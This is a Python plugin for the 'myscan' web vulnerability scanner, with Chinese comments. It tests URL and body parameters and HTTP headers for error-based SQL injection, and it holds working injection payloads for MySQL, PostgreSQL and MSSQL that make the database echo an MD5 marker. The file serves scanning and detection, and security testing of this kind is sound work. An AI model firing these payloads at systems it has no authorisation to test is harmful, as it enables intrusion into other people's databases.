#!/usr/bin/env python3
# @Time    : 2020-02-15
# @Author  : caicai
# @File    : myscan_sqli_error_v1.1.py
'''
报错注入插件
1.在参数值后添加payload,正则匹配关键词
'''
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.helper.request import request
from myscan.lib.helper.helper_sqli import Get_sql_errors
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.data import logger, cmd_line_options
from myscan.lib.core.common import get_random_num, getmd5, getredis
from myscan.config import plugin_set
from myscan.lib.core.threads import mythread
import copy


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sqli error"
        self.vulmsg = "sqli error"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.max_out = 1  #
        self.found = []

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        # 搜索返回包:
        self.parser = dictdata_parser(self.dictdata)

        # 黑名单
        # tomcat
        if self.dictdata.get("url").get("path").startswith("/examples/") or self.dictdata.get("url").get(
                "path").startswith("/docs/"):
            return
        # body url参数注入
        random_num = get_random_num(8)
        random_num_md5 = getmd5(random_num)
        payloads = [
            ('"and/**/extractvalue(1,concat(char(126),md5({})))and"'.format(random_num), random_num_md5, "a"),
            ("'and/**/extractvalue(1,concat(char(126),md5({})))and'".format(random_num), random_num_md5, "a"),
            ("'and(select'1'from/**/cast(md5({})as/**/int))>'0".format(random_num), random_num_md5, "a"),
            ('"and(select\'1\'from/**/cast(md5({})as/**/int))>"0'.format(random_num), random_num_md5, "a"),
            ("'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))>'0".format(random_num),
             random_num_md5, "a"),
            ('"and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(\'MD5\',\'{}\')))>"0'.format(random_num),
             random_num_md5, "a"),
            ("'and/**/extractvalue(1,concat(char(126),md5({})))and'".format(random_num), random_num_md5, "a"),
            ('"and/**/extractvalue(1,concat(char(126),md5({})))and"'.format(random_num), random_num_md5, "a"),
            ("/**/and/**/cast(md5('{}')as/**/int)>0".format(random_num), random_num_md5, "a"),
            ("convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num), random_num_md5,
             "w"),
            ("extractvalue(1,concat(char(126),md5({})))".format(random_num), random_num_md5, "w")
        ]
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        reqs = []
        if params:
            for param in params:
                for payload, search_str, method in [('鎈\'"\(', None, "a")] + payloads:
                    req = self.parser.getreqfromparam(param, method, payload)
                    reqs.append((req, payload, search_str, random_num_md5, param))
        mythread(self.args_inject, reqs, cmd_line_options.threads)

        # header注入
        if not plugin_set.get("sqli").get("header_inject"):
            return
        header_msg = {
            "User-Agent": {"msg": "sqli_error_ua",
                           "default": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"},
            "Referer": {"msg": "sqli_error_referer", "default": "https://www.qq.com/search"},
            "X-Forwarded-For": {"msg": "sqli_error_xff", "default": "12.40.9.144"},
            "Real-Ip": {"msg": "sqli_error_ri", "default": "2.40.9.144"},
            "X-Forwarded-Host": {"msg": "sqli_error_xfh", "default": "2.40.9.144"},
        }
        reqs = []

        for k, v in header_msg.items():
            if self.output(v.get("msg")):
                logger.debug("start {} inject ".format(k))

                headers = copy.deepcopy(self.dictdata.get("request").get("headers"))
                if k not in headers.keys():
                    headers[k] = v.get("default")
                for payload, search_str, method in [('\'"\(', None, "a")] + payloads:
                    headers_withpayload = copy.deepcopy(headers)
                    headers_withpayload[k] = headers_withpayload[k] + payload if method == "a" else payload
                    req = self.parser.generaterequest({"headers": headers_withpayload})
                    reqs.append((req, (payload, search_str, k, v.get("msg"))))
        mythread(self.header_inject, reqs, cmd_line_options.threads)
        # cookie 注入

    def args_inject(self, data):
        req, payload, search_str, random_num_md5, param = data
        param_str = getmd5(str(param))
        if param_str in self.found:
            return
        r = request(**req)
        if r is not None:
            if search_str == None:
                if self.search(r, payload, param.get("name", "")):
                    self.found.append(param_str)
            else:
                if self.search_md5(r, random_num_md5[10:20], payload):
                    self.found.append(param_str)

    def header_inject(self, data):
        req, data_ = data
        payload, search_str, k, msg = data_
        if self.output(msg):
            random_num = get_random_num(8)
            random_num_md5 = getmd5(random_num)
            r = request(**req)
            if r is not None:
                if search_str == None:
                    if self.search(r, payload, "headers's {}".format(k)):
                        self.output(msg, True)
                else:
                    if self.search_md5(r, random_num_md5[10:20], payload):
                        self.output(msg, True)

    def search_md5(self, r, md5, payload):
        if r != None:
            if md5 in r.text:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url").get("url").split("?")[0],
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "dbms_type": "unknown",
                        "payload": payload,
                        "error_info": "md5 str {} in response".format(md5),
                        "request": parser_.getrequestraw().decode(errors="ignore"),
                        "response": parser_.getresponseraw().decode(errors="ignore")
                    }

                })
                return True

    def search(self, r, payload, param_name):
        if r != None:
            for sql_regex, dbms_type in Get_sql_errors():
                r_is_response = True
                findall_now = []
                findall_sour = []
                if isinstance(r, bytes):
                    r_is_response = False
                    text_ = r.decode(errors="ignore")
                    match = sql_regex.search(text_)
                    if match:
                        findall_sour = sql_regex.findall(self.parser.getresponsebody().decode(errors="ignore"))
                        findall_now = sql_regex.findall(text_)
                else:
                    match = sql_regex.search(r.text)
                    if match:
                        findall_sour = sql_regex.findall(self.parser.getresponsebody().decode(errors="ignore"))
                        findall_now = sql_regex.findall(r.text)
                if match and len(findall_sour) != len(findall_now):
                    parser_ = response_parser(r)
                    self.result.append({
                        "name": self.name,
                        "url": self.dictdata.get("url").get("url").split("?")[0],
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "dbms_type": dbms_type,
                            "error_info": match.group(),
                            "param": param_name,
                            "payload": payload,
                            "request": parser_.getrequestraw().decode(errors="ignore") if r_is_response else "",
                            "response": parser_.getresponseraw().decode(errors="ignore") if r_is_response else ""
                        }

                    })
                    return True

    def output(self, msg, insert=False):
        msg = "/".join(self.dictdata.get("url").get("url").split("/")[:3]) + " " + msg
        msgmd5 = getmd5(msg)[10:18]
        red = getredis()
        if insert == False:
            if not red.sismember("myscan_max_output", msgmd5):
                return True  # 可以输出
            else:
                # logger.debug("sql error moudle : {} 输出个数已达{}上限，不再测试输出".format(msg, self.verify_count))
                return False  # 不可以继续输出
        else:
            # red.hincrby("myscan_max_output", msgmd5, amount=1)
            red.sadd("myscan_max_output", msgmd5)
